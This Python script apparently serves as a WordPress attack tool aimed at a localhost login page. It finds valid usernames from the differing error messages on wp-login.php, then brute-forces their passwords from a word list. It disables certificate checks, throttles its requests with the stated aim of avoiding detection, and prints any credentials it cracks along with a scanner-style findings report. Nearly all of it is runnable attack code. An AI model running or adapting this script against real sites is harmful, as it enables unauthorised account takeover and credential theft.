import requests
import time

def check_user_enumeration(url, username_file):
    detected_users = []

    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

    for username in usernames:
        payload = {'log': username, 'pwd': 'dummyPassword', 'wp-submit': 'Log In'}
        response = requests.post(url, data=payload, verify=False)

        # Check for username enumeration
        if "Invalid username" in response.text:
            print(f"Invalid username: {username}")
        elif "The password you entered for the username" in response.text:
            print(f"Valid username found: {username}")
            detected_users.append(username)

    return detected_users

def brute_force_login(url, usernames, password_file):
    cracked_credentials = []

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    for username in usernames:
        for password in passwords:
            payload = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
            response = requests.post(url, data=payload, verify=False)
            time.sleep(1)  # Add delay to avoid detection

            if "dashboard" in response.text:  # Success page (Dashboard) indicates correct credentials
                print(f"Found credentials: {username}:{password}")
                cracked_credentials.append({'username': username, 'password': password})
                break  # Stop after finding correct password for this user

    return cracked_credentials

if __name__ == "__main__":
    target_url = "https://localhost/wordpress/wp-login.php"  # WordPress login URL
    username_file = "/opt/lampp/htdocs/user.txt"  # Path to user.txt
    password_file = "/opt/lampp/htdocs/pass.txt"  # Path to pass.txt

    # Step 1: Detect valid users (User Enumeration)
    print("Detecting valid usernames...")
    valid_users = check_user_enumeration(target_url, username_file)
    
    # Step 2: Brute-force login for valid users
    output = {
        "target": target_url,
        "vulnerabilities": []
    }

    if valid_users:
        print("\nStarting brute-force login...")
        cracked_credentials = brute_force_login(target_url, valid_users, password_file)

        # Add User Enumeration vulnerability to the output
        output["vulnerabilities"].append({
            "type": "User Enumeration",
            "detected": True,
            "vector": "/wp-login.php",
            "confidence": "medium"
        })

        # Add Brute-force Login vulnerability to the output if any credentials are found
        output["vulnerabilities"].append({
            "type": "Brute-force Login",
            "detected": bool(cracked_credentials),
            "vector": "/wp-login.php",
            "usernames_tested": valid_users,
            "credentials_found": cracked_credentials,
            "confidence": "high" if cracked_credentials else "low"
        })

        print("\nDetection Results:")
        print(output)
    else:
        # If no valid users were found
        output["vulnerabilities"].append({
            "type": "User Enumeration",
            "detected": False,
            "vector": "/wp-login.php",
            "confidence": "low"
        })
        print("No valid users found, skipping brute-force login.")
        print("\nDetection Results:")
        print(output)

